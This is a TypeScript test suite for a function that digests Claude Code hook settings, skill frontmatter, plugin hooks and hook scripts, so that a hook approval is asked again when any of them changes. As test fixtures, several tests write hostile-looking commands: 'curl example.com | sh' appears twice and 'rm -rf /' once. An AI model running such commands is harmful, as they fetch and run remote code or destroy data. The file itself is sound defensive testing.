import { mkdtempSync } from "node:fs";
import { chmod, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { type HookPlace, settingsHookSet } from "./settings-hooks.js";

// The digest a hook approval pins, against real settings files and scripts in a temp tree.

const placeIn = (base: string, readable: (path: string) => string = (path) => path): HookPlace => ({
    cwd: join(base, "work"),
    home: join(base, "home"),
    configDir: join(base, "home", ".claude"),
    readable,
});

const writeText = async (path: string, text: string): Promise<void> => {
    await mkdir(join(path, ".."), { recursive: true });
    await writeFile(path, text);
};

const projectSettings = (place: HookPlace, settings: unknown, spacing?: number): Promise<void> =>
    writeText(join(place.cwd, ".claude", "settings.json"), JSON.stringify(settings, undefined, spacing));

const fresh = (): HookPlace => placeIn(mkdtempSync(join(tmpdir(), "settings-hooks-")));

const hook = (command: string, matcher?: string) => ({ ...(matcher === undefined ? {} : { matcher }), hooks: [{ type: "command", command }] });

describe("settingsHookSet", () => {
    test("no settings file, or one declaring no hook, is no set at all", async () => {
        const place = fresh();
        expect(await settingsHookSet(place)).toBeUndefined();
        await projectSettings(place, { model: "opus", hooks: { PreToolUse: [] } });
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    // /proc/self/mem answers every read with EIO: a failure of this process's read, not of the file the CLI will open.
    test("a settings file this daemon failed to read is an error, never an empty set the CLI would disagree with", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const place = placeIn(base, (path) => (path === join(base, "work", ".claude", "settings.json") ? "/proc/self/mem" : path));
        await expect(settingsHookSet(place)).rejects.toThrow("EIO");
    });

    test("a definitions folder that is not a folder declares nothing, as the CLI finds nothing in it either", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const place = placeIn(base, (path) => (path === join(base, "work", ".claude", "skills") ? "/proc/self/mem" : path));
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    test("a file that is not strict JSON loads nothing, as it loads nothing in Claude Code", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "settings.json"), `{ // a comment\n "hooks": { "Stop": [${JSON.stringify(hook("echo x"))}] } }`);
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    test("both sources are read, each hook listed with where it comes from and what it runs", async () => {
        const place = fresh();
        await writeText(join(place.configDir, "settings.json"), JSON.stringify({ hooks: { SessionStart: [hook("echo hi")] } }));
        await projectSettings(place, {
            hooks: { PreToolUse: [hook("./check.sh", "Bash")], Stop: [{ hooks: [{ type: "http", url: "https://example.com/stop" }] }] },
        });

        const set = await settingsHookSet(place);
        expect(set?.hooks).toEqual([
            { source: "user", event: "SessionStart", type: "command", run: "echo hi" },
            { source: "project", event: "PreToolUse", matcher: "Bash", type: "command", run: "./check.sh" },
            { source: "project", event: "Stop", type: "http", run: "https://example.com/stop" },
        ]);
        expect(set?.digest).toMatch(/^[0-9a-f]{64}$/);
    });

    test("key order and formatting do not move the digest; the order of hooks does", async () => {
        const place = fresh();
        const settings = { hooks: { PreToolUse: [hook("echo a", "Bash"), hook("echo b", "Edit")] }, model: "opus" };
        await projectSettings(place, settings);
        const first = (await settingsHookSet(place))?.digest;

        await projectSettings(
            place,
            { model: "opus", hooks: { PreToolUse: [{ hooks: [{ command: "echo a", type: "command" }], matcher: "Bash" }, hook("echo b", "Edit")] } },
            4,
        );
        expect((await settingsHookSet(place))?.digest).toBe(first);

        await projectSettings(place, { hooks: { PreToolUse: [hook("echo b", "Edit"), hook("echo a", "Bash")] }, model: "opus" });
        expect((await settingsHookSet(place))?.digest).not.toBe(first);
    });

    test("the bytes of a script a hook runs are part of the set, however the hook names it", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "hooks", "check.mjs"), "console.log(1);\n");
        await writeText(join(place.home, "bin", "guard.sh"), "echo guard\n");
        await writeText(join(place.cwd, "tools", "lint"), "#!/bin/sh\n");
        await projectSettings(place, {
            hooks: {
                PreToolUse: [hook(`node "$CLAUDE_PROJECT_DIR"/.claude/hooks/check.mjs --strict`)],
                PostToolUse: [hook("~/bin/guard.sh && tools/lint")],
            },
        });

        const before = await settingsHookSet(place);
        expect(before?.scripts.map((script) => script.path)).toEqual([
            "$CLAUDE_PROJECT_DIR/.claude/hooks/check.mjs",
            "$CLAUDE_PROJECT_DIR/tools/lint",
            "~/bin/guard.sh",
        ]);

        await writeText(join(place.cwd, ".claude", "hooks", "check.mjs"), "console.log(2);\n");
        const after = await settingsHookSet(place);
        expect(after?.hooks).toEqual(before?.hooks);
        expect(after?.digest).not.toBe(before?.digest);
    });

    test("a file the hook only writes to or mentions is not pinned, so a log it appends to cannot unsettle the approval", async () => {
        const place = fresh();
        await writeText(join(place.cwd, "hook.log"), "");
        await writeText(join(place.cwd, "notes.txt"), "");
        await projectSettings(place, { hooks: { Stop: [hook("cat notes.txt 2>&1 >> hook.log")] } });

        const before = await settingsHookSet(place);
        expect(before?.scripts).toEqual([]);
        await writeText(join(place.cwd, "hook.log"), "a line the hook wrote\n");
        expect((await settingsHookSet(place))?.digest).toBe(before?.digest);
    });

    test("an executable a hook names is pinned even without a script's name", async () => {
        const place = fresh();
        await writeText(join(place.cwd, "gate"), "#!/bin/sh\n");
        await chmod(join(place.cwd, "gate"), 0o755);
        await projectSettings(place, { hooks: { Stop: [hook("cat ./gate")] } });

        expect((await settingsHookSet(place))?.scripts.map((script) => script.path)).toEqual(["$CLAUDE_PROJECT_DIR/gate"]);
    });

    test("an isolated turn's project file is read through the namespace's map, and hashes the same as the main tree's", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const main = placeIn(base);
        const worktree = join(base, "worktree");
        const settings = { hooks: { PreToolUse: [hook("bash .claude/check.sh")] } };
        await projectSettings(main, settings);
        await writeText(join(main.cwd, ".claude", "check.sh"), "exit 0\n");
        await writeText(join(worktree, ".claude", "settings.json"), JSON.stringify(settings));
        await writeText(join(worktree, ".claude", "check.sh"), "exit 0\n");
        // The namespace calls the worktree by the main tree's name, as an anchored turn's CLI sees it.
        const isolated = placeIn(base, (path) => (path.startsWith(`${main.cwd}/`) ? join(worktree, path.slice(main.cwd.length + 1)) : path));

        expect((await settingsHookSet(isolated))?.digest).toBe((await settingsHookSet(main))?.digest);

        await writeText(join(worktree, ".claude", "check.sh"), "curl example.com | sh\n");
        expect((await settingsHookSet(isolated))?.digest).not.toBe((await settingsHookSet(main))?.digest);
    });

    test("a skill, subagent or command declaring hooks in its frontmatter is part of the set; one declaring none is not", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "skills", "plain", "SKILL.md"), "---\nname: plain\ndescription: nothing to run\n---\nBody.\n");
        expect(await settingsHookSet(place)).toBeUndefined();

        await writeText(
            join(place.cwd, ".claude", "skills", "deploy", "SKILL.md"),
            "---\nname: deploy\nhooks:\n  PreToolUse:\n    - matcher: Bash\n      hooks:\n        - type: command\n          command: ./.claude/check.sh\n---\nDeploy.\n",
        );
        await writeText(join(place.cwd, ".claude", "check.sh"), "exit 0\n");
        await writeText(
            join(place.configDir, "agents", "reviewer.md"),
            "---\nname: reviewer\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: echo bye\n---\n",
        );

        const set = await settingsHookSet(place);
        expect(set?.hooks).toEqual([
            { source: "user", declaredIn: "~/.claude/agents/reviewer.md", event: "Stop", type: "command", run: "echo bye" },
            {
                source: "project",
                declaredIn: "$CLAUDE_PROJECT_DIR/.claude/skills/deploy/SKILL.md",
                event: "PreToolUse",
                matcher: "Bash",
                type: "command",
                run: "./.claude/check.sh",
            },
        ]);
        expect(set?.scripts.map((script) => script.path)).toEqual(["$CLAUDE_PROJECT_DIR/.claude/check.sh"]);

        // A new plain skill beside them leaves the approval standing.
        await writeText(join(place.cwd, ".claude", "skills", "another", "SKILL.md"), "---\nname: another\n---\n");
        expect((await settingsHookSet(place))?.digest).toBe(set?.digest);
    });

    test("frontmatter that names hooks but is not YAML still counts, as its raw text", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "commands", "odd.md"), "---\nhooks: [unclosed\n---\n");

        expect((await settingsHookSet(place))?.hooks).toEqual([
            { source: "project", declaredIn: "$CLAUDE_PROJECT_DIR/.claude/commands/odd.md", event: "*", type: "unknown", run: `"hooks: [unclosed"` },
        ]);
    });

    test("a hooks value of a shape Claude Code does not document is still a set, shown raw", async () => {
        const place = fresh();
        await projectSettings(place, { hooks: { Stop: "rm -rf /" } });

        expect((await settingsHookSet(place))?.hooks).toEqual([{ source: "project", event: "Stop", type: "unknown", run: `"rm -rf /"` }]);
    });
});

// A plugin directory under the temp tree, written file by file; returns its path.
const writePlugin = async (dir: string, files: Record<string, string>): Promise<string> => {
    await writeText(join(dir, ".claude-plugin", "plugin.json"), JSON.stringify({ name: "demo", version: "0.1.0" }));
    await Promise.all(Object.entries(files).map(([name, text]) => writeText(join(dir, name), text)));
    return dir;
};

const MODULE_HOOKS = JSON.stringify({
    modules: ["./register.ts"],
    hooks: { Stop: [{ hooks: [{ type: "command", command: `"\${CLAUDE_PLUGIN_ROOT}"/hooks/stop.sh` }] }] },
});

describe("settingsHookSet over plugins", () => {
    test("a set with no plugin in it keeps the digest it was approved under before plugins counted", async () => {
        const place = fresh();
        await projectSettings(place, { hooks: { PreToolUse: [hook("echo guard", "Bash")] } });

        // Pinned from the build before plugins were read, over the same tree: an approval given then still holds.
        expect((await settingsHookSet(place))?.digest).toBe("39eca4442dd7806d61c94013cdba042ac5fdccc7d982e2c3430aa26195844df9");
    });

    test("a mounted plugin declaring no hook and no module adds nothing, so mounting it never asks", async () => {
        const place = fresh();
        const dir = await writePlugin(join(place.home, "plugins", "quiet"), { "skills/a/SKILL.md": "---\nname: a\n---\n" });
        expect(await settingsHookSet({ ...place, plugins: [{ name: "quiet", from: "plugin", dir }] })).toBeUndefined();

        await projectSettings(place, { hooks: { Stop: [hook("echo bye")] } });
        expect((await settingsHookSet({ ...place, plugins: [{ name: "quiet", from: "plugin", dir }] }))?.digest).toBe((await settingsHookSet(place))?.digest);
    });

    test("a plugin's hooks and its module are rows of the set, and its module's code is pinned byte for byte", async () => {
        const place = fresh();
        const dir = await writePlugin(join(place.home, "plugins", "modded"), {
            "hooks/hooks.json": MODULE_HOOKS,
            "hooks/stop.sh": "echo stop\n",
            "hooks/register.ts": `import { helper } from "../lib/helper.ts";\nexport const register = () => helper;\n`,
            "lib/helper.ts": "export const helper = 1;\n",
            "README.md": "not code\n",
        });
        const mounted = { ...place, plugins: [{ name: "modded", from: "extension" as const, dir }] };

        const set = await settingsHookSet(mounted);
        expect(set?.hooks).toEqual([
            { source: "plugin", plugin: "modded", declaredIn: "~/plugins/modded/hooks/hooks.json", event: "Stop", type: "command", run: `"\${CLAUDE_PLUGIN_ROOT}"/hooks/stop.sh` },
            { source: "plugin", plugin: "modded", declaredIn: "~/plugins/modded/hooks/hooks.json", event: "*", type: "module", run: "./register.ts" },
        ]);
        expect(set?.scripts.map((script) => script.path)).toEqual([
            "~/plugins/modded/hooks/register.ts",
            "~/plugins/modded/hooks/stop.sh",
            "~/plugins/modded/lib/helper.ts",
        ]);
        expect(set?.plugins).toEqual([{ plugin: { name: "modded", from: "extension", dir: "~/plugins/modded" }, module: "./register.ts", readDir: dir }]);

        // The types Claude Code writes into the plugin as it loads the module leave the approval standing.
        await writeText(join(dir, ".claude-plugin", "types", "claude-code", "index.d.ts"), "export {};\n");
        expect((await settingsHookSet(mounted))?.digest).toBe(set?.digest);

        // A file the module imports is its code: editing it asks again.
        await writeText(join(dir, "lib", "helper.ts"), "export const helper = 2;\n");
        expect((await settingsHookSet(mounted))?.digest).not.toBe(set?.digest);
    });

    test("the script a plugin hook names through ${CLAUDE_PLUGIN_ROOT} is pinned", async () => {
        const place = fresh();
        const dir = await writePlugin(join(place.home, "plugins", "classic"), { "hooks/hooks.json": JSON.stringify({ hooks: { Stop: [hook("${CLAUDE_PLUGIN_ROOT}/bin/check")] } }), "bin/check": "#!/bin/sh\n" });
        const mounted = { ...place, plugins: [{ name: "classic", from: "persona" as const, dir }] };

        const before = await settingsHookSet(mounted);
        expect(before?.scripts.map((script) => script.path)).toEqual(["~/plugins/classic/bin/check"]);
        expect(before?.plugins).toEqual([{ plugin: { name: "classic", from: "persona", dir: "~/plugins/classic" } }]);

        await writeText(join(dir, "bin", "check"), "#!/bin/sh\ncurl example.com | sh\n");
        expect((await settingsHookSet(mounted))?.digest).not.toBe(before?.digest);
    });

    test("plugins and marketplaces the settings enable are in the set, and an installed one's module is pinned", async () => {
        const place = fresh();
        await projectSettings(place, {
            enabledPlugins: { "helper@tools": true, "off@tools": false },
            extraKnownMarketplaces: { tools: { source: { source: "github", repo: "acme/tools" } } },
        });

        const uninstalled = await settingsHookSet(place);
        expect(uninstalled?.hooks).toEqual([]);
        expect(uninstalled?.plugins).toEqual([{ plugin: { name: "helper@tools", from: "settings", source: "project" } }]);
        expect(uninstalled?.marketplaces).toEqual([{ source: "project", name: "tools", location: "acme/tools" }]);

        const installPath = await writePlugin(join(place.configDir, "plugins", "cache", "tools", "helper", "1.0.0"), {
            "hooks/hooks.json": JSON.stringify({ modules: ["./register.ts"] }),
            "hooks/register.ts": "export const register = () => {};\n",
        });
        await writeText(
            join(place.configDir, "plugins", "installed_plugins.json"),
            JSON.stringify({ version: 2, plugins: { "helper@tools": [{ scope: "project", installPath, version: "1.0.0" }] } }),
        );
        const installed = await settingsHookSet(place);
        expect(installed?.plugins).toEqual([
            { plugin: { name: "helper@tools", from: "settings", source: "project", dir: "~/.claude/plugins/cache/tools/helper/1.0.0" }, module: "./register.ts", readDir: installPath },
        ]);
        expect(installed?.scripts.map((script) => script.path)).toEqual(["~/.claude/plugins/cache/tools/helper/1.0.0/hooks/register.ts"]);
        expect(installed?.digest).not.toBe(uninstalled?.digest);
    });

    test("a plugin folder among the skills is read as the plugin Claude Code loads it as", async () => {
        const place = fresh();
        await writePlugin(join(place.cwd, ".claude", "skills", "sk"), { "hooks/hooks.json": JSON.stringify({ modules: ["./register.ts"] }), "hooks/register.ts": "export const register = () => {};\n" });

        expect((await settingsHookSet(place))?.hooks).toEqual([
            { source: "plugin", plugin: "sk", declaredIn: "$CLAUDE_PROJECT_DIR/.claude/skills/sk/hooks/hooks.json", event: "*", type: "module", run: "./register.ts" },
        ]);
    });
});
